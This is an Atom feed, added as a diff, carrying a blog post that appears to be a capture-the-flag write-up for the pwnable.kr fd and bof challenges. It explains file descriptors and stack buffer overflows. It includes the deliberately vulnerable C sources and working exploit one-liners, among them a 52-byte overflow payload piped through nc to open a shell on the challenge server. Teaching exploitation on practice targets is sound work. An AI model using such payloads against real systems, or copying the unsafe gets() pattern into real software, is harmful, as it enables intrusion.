@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - pwnable.kr</title>
+	<link href="/tags/pwnable-kr/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2020-04-27T13:02:48.347+00:00</updated>
+	<id>/tags/pwnable-kr/atom.xml</id>
+	<entry xml:lang="en">
+		<title>pwnable.kr - Toddler&#x27;s Bottle</title>
+		<published>2020-04-27T12:59:37.396+00:00</published>
+		<updated>2020-04-27T13:02:48.347+00:00</updated>
+		<link href="/posts/pwnable-kr-toddler-s-bottle/" type="text/html"/>
+		<id>/posts/pwnable-kr-toddler-s-bottle/</id>
+		<content type="html">&lt;h1 id=&quot;fd-1pt&quot;&gt;fd - 1pt&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Mommy! what is a file descriptor in Linux?&lt;&#x2F;p&gt;
+&lt;p&gt;ssh fd@pwnable.kr -p2222 (pw:guest)&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h2 id=&quot;source-code&quot;&gt;Source Code&lt;&#x2F;h2&gt;
+&lt;p&gt;After ssh-ing into the server with the given details, we can view the source code of the challenge by running &lt;code&gt;cat fd.c&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdio.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdlib.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;string.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; buf[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argc, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argv[], &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;envp[]){
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(argc&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;pass argv[1] a number&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+        }
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; fd &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;atoi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;( argv[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] ) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x1234&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; len &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+        len &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;read(fd, buf, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strcmp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;LETMEWIN&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, buf)){
+                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;good job :)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;bin&#x2F;cat flag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        }
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;learn about Linux file IO&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h2 id=&quot;file-descriptors&quot;&gt;File Descriptors&lt;&#x2F;h2&gt;
+&lt;p&gt;On POSIX systems, there are three standard file descriptors:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Standard Input (stdin) which has a fd of &lt;code&gt;0&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Standard Output (stdout) which has a fd of &lt;code&gt;1&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Standard Error (stderr) which has a fd of &lt;code&gt;2&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;&#x2F;h2&gt;
+&lt;p&gt;The program subtracts 0x1234 from a file descriptor we provide and then reads from it. If the read string is &lt;code&gt;LETMEWIN\n&lt;&#x2F;code&gt;, it gives us the flag. If we get the program to read from &lt;code&gt;stdin&lt;&#x2F;code&gt;, we can just type &lt;code&gt;LETMEWIN&lt;&#x2F;code&gt; into the terminal, and we will get the flag:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; LETMEWIN &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.&#x2F;fd $(python -c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;print 0x1234 + 0&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h1 id=&quot;bof-5pt&quot;&gt;bof - 5pt&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;challenge-1&quot;&gt;Challenge&lt;&#x2F;h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?&lt;&#x2F;p&gt;
+&lt;p&gt;Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof&lt;&#x2F;p&gt;
+&lt;p&gt;Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof.c&lt;&#x2F;p&gt;
+&lt;p&gt;Running at : nc pwnable.kr 9000&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h2 id=&quot;source-code-1&quot;&gt;Source Code&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdio.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;string.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdlib.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;key){
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; overflowme[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;overflow me : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;gets&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(overflowme);	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; smash me!
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(key &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0xcafebabe&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;bin&#x2F;sh&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+	}
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Nah..&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+	}
+}
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argc, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argv[]){
+	func(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0xdeadbeef&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;background&quot;&gt;Background&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;stack-frames&quot;&gt;Stack Frames&lt;&#x2F;h3&gt;
+&lt;p&gt;The stack stores local variables and function parameters and is used to pass parameters with certain calling conventions. This diagram (taken from &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Call_stack&quot;&gt;Wikipedia&lt;&#x2F;a&gt;) shows an example stack layout:&lt;&#x2F;p&gt;
+&lt;p&gt;svg(path=&amp;quot;5ea6d67bcea15a083827d578.svg&amp;quot;)&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;gets&quot;&gt;gets&lt;&#x2F;h3&gt;
+&lt;p&gt;The function &lt;code&gt;gets&lt;&#x2F;code&gt; is insecure and allows for buffer overflows when used because it only stops at new lines or EOF. The manpage for gets (&lt;code&gt;man gets&lt;&#x2F;code&gt;) says this:&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the  end  of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h2 id=&quot;solution-1&quot;&gt;Solution&lt;&#x2F;h2&gt;
+&lt;p&gt;We need to overwrite the &lt;code&gt;key&lt;&#x2F;code&gt; parameter passed to &lt;code&gt;func&lt;&#x2F;code&gt;. To get there we will need to overwrite 36 bytes (&lt;code&gt;char overflowme[32]&lt;&#x2F;code&gt;, and the return address (4 bytes in 32-bit programs)). However, additional values are pushed onto the stack to save the previous location of the stack. Therefore, we have to place &lt;code&gt;0xcafebabe&lt;&#x2F;code&gt; at 52 bytes into the stack:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(python -c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;print(&amp;#39;A&amp;#39;*52 + &amp;#39;\xbe\xba\xfe\xca&amp;#39;)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cat - ) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;nc pwnable.kr 9000
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Note that &lt;code&gt;0xcafebabe&lt;&#x2F;code&gt; is encoded into a little-endian format, and &lt;code&gt;cat -&lt;&#x2F;code&gt; is used to allow us to communicate with the opened shell.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+</feed>
